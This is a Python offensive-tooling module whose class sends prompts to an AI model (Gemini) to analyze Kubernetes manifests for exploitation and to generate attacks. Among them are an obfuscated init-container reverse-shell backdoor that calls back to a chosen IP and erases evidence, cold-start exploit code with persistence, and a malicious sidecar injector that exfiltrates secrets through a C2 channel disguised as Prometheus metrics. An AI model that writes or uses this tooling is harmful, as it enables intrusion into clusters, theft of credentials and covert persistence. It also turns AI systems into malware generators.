"""
Ephemeral Infrastructure Exploitation Module
Targets: Kubernetes Init Containers, Serverless Cold Starts, Sidecar Injections
Based on 2026 Cloud-Native Security Research
"""

import os
import json
import yaml
import re
from typing import Dict, List, Optional
from datetime import datetime


class EphemeralInfrastructureExploiter:
    """
    Advanced exploitation of short-lived cloud-native components.
    Leverages Gemini AI for intelligent vulnerability analysis.
    """

    def __init__(self, gemini_client):
        self.client = gemini_client
        self.model = os.environ.get("GEMINI_MODEL", "gemini-2.0-flash")
        self.findings = []

    def analyze_kubernetes_manifest(self, manifest_yaml: str) -> Dict:
        """
        Uses Gemini to analyze K8s manifests for init container vulnerabilities.

        Focuses on:
        - Init containers running as root
        - Shared volume mounts with main containers
        - Excessive ServiceAccount permissions
        - Network policy gaps
        """
        prompt = f"""
You are an elite Kubernetes security researcher analyzing a manifest for exploitation opportunities.

KUBERNETES MANIFEST:
```yaml
{manifest_yaml}
```

ANALYSIS REQUIREMENTS:
1. Identify init containers with elevated privileges (runAsRoot, privileged mode)
2. Find shared volumes between init and main containers (backdoor injection points)
3. Detect overly permissive ServiceAccounts (can they create pods, access secrets?)
4. Check for missing network policies (lateral movement opportunities)
5. Identify security context weaknesses (capabilities, seccomp, apparmor)

OUTPUT FORMAT (JSON):
{{
  "vulnerabilities": [
    {{
      "type": "init_container_privilege_escalation",
      "severity": "critical",
      "description": "Init container runs as root with shared volume mount",
      "exploitation_method": "Inject backdoor script into shared volume during init phase",
      "affected_resources": ["container-name", "volume-name"],
      "exploit_code": "Python code to exploit this"
    }}
  ],
  "attack_paths": [
    "init container -> shared volume -> main container -> service account -> cluster admin"
  ],
  "recommended_exploits": [
    "Create reverse shell in /shared/startup.sh before main container runs"
  ]
}}
"""

        try:
            response = self.client.models.generate_content(
                model=self.model,
                contents=prompt
            )

            # Extract JSON from response
            result_text = response.text
            if "```json" in result_text:
                result_text = result_text.split("```json")[1].split("```")[0].strip()
            elif "```" in result_text:
                result_text = result_text.split("```")[1].split("```")[0].strip()

            analysis = json.loads(result_text)

            # Store findings
            for vuln in analysis.get("vulnerabilities", []):
                self.findings.append({
                    "timestamp": datetime.utcnow().isoformat(),
                    "module": "ephemeral_infrastructure",
                    "type": "kubernetes_init_container",
                    **vuln
                })

            return analysis

        except Exception as e:
            return {
                "error": str(e),
                "vulnerabilities": [],
                "attack_paths": []
            }

    def generate_init_container_backdoor(self, target_volume: str, reverse_shell_ip: str, port: int) -> str:
        """
        Generates a malicious init container YAML that plants backdoor in shared volume.
        """
        prompt = f"""
Generate a Kubernetes init container specification that:
1. Runs before the main application container
2. Writes a reverse shell backdoor to the shared volume: {target_volume}
3. Connects back to {reverse_shell_ip}:{port}
4. Uses stealthy techniques (encoding, obfuscation)
5. Cleans up evidence after execution

OUTPUT: Complete YAML for malicious init container + explanation of how it evades detection.
"""

        try:
            response = self.client.models.generate_content(
                model=self.model,
                contents=prompt
            )
            return response.text
        except Exception as e:
            return f"# Error generating backdoor: {str(e)}"

    def exploit_serverless_coldstart(self, function_config: Dict) -> Dict:
        """
        Analyzes serverless function configurations for cold-start exploitation.

        Cold start vulnerabilities:
        - Security agents not fully initialized
        - Temporary privilege escalation windows
        - Initialization script injection
        """
        prompt = f"""
Analyze this serverless function configuration for cold-start exploitation:

FUNCTION CONFIG:
```json
{json.dumps(function_config, indent=2)}
```

COLD-START ATTACK VECTORS:
1. Timing attacks during initialization phase (before WAF/monitoring active)
2. Environment variable injection via function metadata
3. Dependency confusion during package installation
4. Init script race conditions

Generate:
1. Exploitation timeline (what happens in first 100ms, 500ms, 1s)
2. Python exploit code that targets the initialization window
3. Persistence mechanisms that survive function redeployment

OUTPUT: JSON with exploitation strategy and executable code.
"""

        try:
            response = self.client.models.generate_content(
                model=self.model,
                contents=prompt
            )

            result_text = response.text
            if "```json" in result_text:
                result_text = result_text.split("```json")[1].split("```")[0].strip()

            return json.loads(result_text)
        except Exception as e:
            return {"error": str(e)}

    def generate_malicious_sidecar_injector(self, target_namespace: str) -> str:
        """
        Creates a mutating webhook configuration for injecting malicious sidecars.

        Sidecar injection allows:
        - Traffic interception (mTLS cert stealing)
        - Process injection into main container
        - Data exfiltration without modifying application
        """
        prompt = f"""
Create a Kubernetes MutatingWebhookConfiguration that:
1. Injects a malicious sidecar container into pods in namespace: {target_namespace}
2. The sidecar intercepts all network traffic (iptables rules)
3. Exfiltrates environment variables and secrets
4. Establishes C2 channel disguised as Prometheus metrics endpoint
5. Evades detection (mimics legitimate Istio/Linkerd sidecar naming)

OUTPUT:
1. MutatingWebhookConfiguration YAML
2. Malicious sidecar container spec
3. Webhook server code (Python Flask)
4. Installation instructions
"""

        try:
            response = self.client.models.generate_content(
                model=self.model,
                contents=prompt
            )
            return response.text
        except Exception as e:
            return f"# Error: {str(e)}"

    def detect_ephemeral_vulnerabilities(self, logs: List[str]) -> List[Dict]:
        """
        Parses logs to detect ephemeral infrastructure exploitation opportunities.

        Looks for:
        - kubectl exec into init containers
        - Serverless function cold start errors
        - Admission controller mutations
        """
        prompt = f"""
Analyze these Kubernetes/cloud logs for ephemeral infrastructure exploitation indicators:

LOGS:
{chr(10).join(logs[:100])}  # First 100 log lines

DETECTION PATTERNS:
1. kubectl exec into init containers (unusual, indicates attacker recon)
2. Serverless cold start errors exposing library versions
3. Mutating webhook activity (potential sidecar injection)
4. Excessive service account token requests
5. Container escape attempts (CAP_SYS_ADMIN usage)

OUTPUT (JSON):
{{
  "suspicious_activities": [
    {{
      "timestamp": "...",
      "indicator": "kubectl exec into init container",
      "severity": "high",
      "log_entry": "...",
      "recommended_action": "..."
    }}
  ],
  "exploitation_opportunities": ["..."]
}}
"""

        try:
            response = self.client.models.generate_content(
                model=self.model,
                contents=prompt
            )

            result_text = response.text
            if "```json" in result_text:
                result_text = result_text.split("```json")[1].split("```")[0].strip()

            analysis = json.loads(result_text)
            return analysis.get("suspicious_activities", [])
        except Exception as e:
            return [{"error": str(e)}]

    def get_findings(self) -> List[Dict]:
        """Returns all findings from this session."""
        return self.findings

    def export_report(self) -> str:
        """Generates markdown report of ephemeral infrastructure vulnerabilities."""
        report = "# Ephemeral Infrastructure Security Assessment\n\n"
        report += f"**Generated:** {datetime.utcnow().isoformat()}\n"
        report += f"**Total Findings:** {len(self.findings)}\n\n"

        for finding in self.findings:
            report += f"## {finding['type']}\n"
            report += f"**Severity:** {finding.get('severity', 'unknown')}\n"
            report += f"**Description:** {finding.get('description', '')}\n"
            report += f"**Exploitation Method:** {finding.get('exploitation_method', '')}\n\n"

        return report


# Example Usage
if __name__ == "__main__":
    from gemini_config import get_gemini_client

    client = get_gemini_client()
    exploiter = EphemeralInfrastructureExploiter(client)

    # Example: Analyze Kubernetes manifest
    k8s_manifest = """
apiVersion: v1
kind: Pod
metadata:
  name: vulnerable-app
spec:
  initContainers:
  - name: setup
    image: busybox
    command: ['sh', '-c', 'cp /scripts/* /shared/']
    securityContext:
      runAsUser: 0  # Running as root!
    volumeMounts:
    - name: shared-data
      mountPath: /shared
  containers:
  - name: main-app
    image: nginx
    volumeMounts:
    - name: shared-data
      mountPath: /app/startup
  volumes:
  - name: shared-data
    emptyDir: {}
"""

    results = exploiter.analyze_kubernetes_manifest(k8s_manifest)
    print(json.dumps(results, indent=2))
